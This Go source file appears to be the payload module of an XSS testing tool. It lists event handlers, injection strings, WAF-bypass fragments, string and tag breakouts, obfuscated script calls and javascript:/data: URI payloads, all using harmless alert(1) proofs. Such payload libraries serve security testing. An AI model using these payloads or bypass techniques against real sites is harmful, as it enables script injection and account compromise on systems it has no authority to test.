package payload

// a collection of payload fragments and patterns for generating XSS payloads.

// EventHandlerPayloads provides a list of common JavaScript event handlers used for XSS.
var EventHandlerPayloads = []string{
	"onabort", "onactivate", "onafterprint", "onafterupdate", "onbeforeactivate", "onbeforecopy",
	"onbeforecut", "onbeforedeactivate", "onbeforeeditfocus", "onbeforepaste", "onbeforeprint",
	"onbeforeunload", "onbeforeupdate", "onblur", "onbounce", "oncellchange", "onchange",
	"onclick", "oncontextmenu", "oncontrolselect", "oncopy", "oncut", "ondataavailable",
	"ondatasetchanged", "ondatasetcomplete", "ondblclick", "ondeactivate", "ondrag", "ondragend",
	"ondragenter", "ondragleave", "ondragover", "ondragstart", "ondrop", "onerror", "onerrorupdate",
	"onfilterchange", "onfinish", "onfocus", "onfocusin", "onfocusout", "onhashchange", "onhelp",
	"oninput", "oninvalid", "onkeydown", "onkeypress", "onkeyup", "onlayoutcomplete", "onload",
	"onloadstart", "onlosecapture", "onmessage", "onmousedown", "onmouseenter", "onmouseleave",
	"onmousemove", "onmouseout", "onmouseover", "onmouseup", "onmousewheel", "onmove", "onmoveend",
	"onmovestart", "onoffline", "ononline", "onpaste", "onpause", "onplay", "onplaying",
	"onprogress", "onpropertychange", "onreadystatechange", "onredo", "onrepeat", "onreset",
	"onresize", "onresizeend", "onresizestart", "onresume", "onreverse", "onrowsenter", "onrowexit",
	"onrowsdelete", "onrowsinserted", "onscroll", "onseek", "onselect", "onselectionchange",
	"onselectstart", "onstart", "onstop", "onsubmit", "onsyncrestored", "ontimeerror",
	"ontimeupdate", "ontoggle", "ontouchend", "ontouchmove", "ontouchstart", "ontrackchange",
	"onundo", "onunload", "onurlflip", "onwaiting", "ontoggle",
}

// WafBypassPayloads provides a list of fragments and techniques to bypass WAFs.
// These are often combined with other payloads.
var WafBypassPayloads = []string{
	// Classic Payloads
	"<svg/onload=alert(1)>",
	"<img src=x onerror=alert(1)>",
	"<body onload=alert(1)>",
	"<video src=x onerror=alert(1)>",
	"<audio src=x onerror=alert(1)>",
	"<details open ontoggle=alert(1)>",

	// Whitespace and Comment Bypasses
	"/*", "*/", "<!--", "-->", "//",
	"/**/",
	"&#9;",    // Tab
	"&#10;",   // Newline
	"&#13;",   // Carriage return
	"`",       // Backtick
	"\"", "'", // Quotes
	"%0a", "%0d", "%09", // URL-encoded whitespace
	"String.fromCharCode(88,83,83)", // 'XSS'
}

// JsBreakoutPayloads contains payloads to break out of JavaScript string contexts.
// The placeholders "{{script}}" will be replaced by the actual script.
var JsBreakoutPayloads = map[string]string{
	"single_quote":      "';{{script}}//",
	"double_quote":      "\";{{script}}//",
	"backtick":          "`;{{script}}//",
	"single_quote_html": "&apos;;{{script}}//",
	"double_quote_html": "&quot;;{{script}}//",
}

// ModernJSPayloads provides payloads that leverage newer JavaScript features.
// The placeholders "{{script}}" will be replaced by the actual script.
var ModernJSPayloads = []string{
	"{{script}}", // Base case
	"String.fromCharCode(97, 108, 101, 114, 116, 40, 49, 41)", // alert(1)
	"eval(atob('YWxlcnQoMSk='))",
	"setTimeout`{{script}}`",
	"setInterval`{{script}}`",
	"new Function`{{script}}`",
	"constructor.constructor`{{script}}`()",
	"requestAnimationFrame`{{script}}`",
}

// HTMLBreakoutPayloads contains payloads to break out of the current HTML tag or comment.
var HTMLBreakoutPayloads = map[string]string{
	"tag_breakout":       ">",
	"comment_breakout_1": "-->",
	"comment_breakout_2": "--!>",
	"comment_breakout_3": "--/>",
	"comment_breakout_4": "-- >",
}

// ProtocolPayloads contains payloads using different URI schemes.
// The placeholders "{{script}}" will be replaced by the actual script.
var ProtocolPayloads = []string{
	"javascript:{{script}}",
	"JaVaScRiPt:{{script}}",
	"data:text/html,<script>{{script}}</script>",
	"data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==",
}
